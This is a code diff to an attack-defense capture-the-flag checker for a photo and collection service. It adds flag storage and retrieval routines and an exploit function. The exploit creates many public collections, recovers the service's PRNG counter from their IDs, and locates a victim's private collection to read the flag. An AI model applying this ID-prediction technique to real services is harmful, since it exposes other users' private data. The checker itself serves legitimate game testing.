@@ -9,6 +9,8 @@ import user
 from user import User
 import qr
 import photo
+import collection
+import prng_recover
 import uuid
 from photo import Photo, Coordinate, Privacy
 from logging import LoggerAdapter
@@ -401,6 +403,100 @@ async def exploit_cache(
     data = await photo.get_data_public(conn, p.asset_id, cookies)
 
     return qr.decode(data)
+
+
+@checker.putflag(2)
+async def put_prng_collection_flag(
+    task: PutflagCheckerTaskMessage,
+    db: ChainDB,
+    conn: Connection,
+    logger: LoggerAdapter,
+) -> None:
+    u: User = user.random_user()
+    cookies = await user.register(conn, u)
+
+    flag_desc = (
+        f"flag {task.flag} {utils.random_string(16, CHARSET_UPPER_ALPHANUMERIC)}"
+    )
+    public_id = await collection.create(
+        conn, cookies, name="private notes", description=flag_desc, private=True
+    )
+
+    col_data = await collection.get(conn, public_id, cookies)
+    assert_equals(
+        col_data.get("description"), flag_desc, "flag not stored in collection"
+    )
+
+    await db.set("user_prng", asdict(u))
+    await db.set("col_public_id", public_id)
+    await db.set("col_description", flag_desc)
+    return u.name
+
+
+@checker.getflag(2)
+async def get_prng_collection_flag(
+    task: GetflagCheckerTaskMessage,
+    db: ChainDB,
+    logger: LoggerAdapter,
+    conn: Connection,
+) -> None:
+    try:
+        u: User = User(**await db.get("user_prng"))
+        public_id: str = await db.get("col_public_id")
+    except KeyError:
+        raise MumbleException("Missing database entry from putflag")
+
+    cookies = await user.login(conn, u)
+
+    col_data = await collection.get(conn, public_id, cookies)
+
+    desc = col_data.get("description", "")
+    assert_in(task.flag, desc, f"flag not found in collection description: {desc}")
+
+
+@run_in_thread
+@checker.exploit(2)
+async def exploit_prng(
+    task: ExploitCheckerTaskMessage,
+    searcher: FlagSearcher,
+    conn: Connection,
+    logger: LoggerAdapter,
+) -> str:
+    assert task.attack_info is not None
+    victim_name = task.attack_info
+
+    u: User = user.random_user()
+    cookies = await user.register(conn, u)
+
+    observed: list[str] = []
+    for _ in range(prng_recover.BURST_SIZE):
+        pid = await collection.create(
+            conn,
+            cookies,
+            name=utils.random_string(10, CHARSET_UPPER_ALPHANUMERIC),
+            description="",
+            private=False,
+        )
+        observed.append(pid)
+
+    logger.info(f"observed {len(observed)} public_ids, recovering counter...")
+
+    start_counter = prng_recover.recover_state(observed)
+    if start_counter is None:
+        raise MumbleException("failed to recover counter from observed public_ids")
+
+    logger.info(f"recovered start counter: {start_counter}")
+
+    description = await prng_recover.find_victim_collection(
+        conn, start_counter, victim_name
+    )
+    if description is None:
+        raise MumbleException("did not find victim's collection")
+
+    flag = searcher.search_flag(description)
+    if flag:
+        return flag
+    raise MumbleException("found matching collection but no flag in description")
 
 
 if __name__ == "__main__":
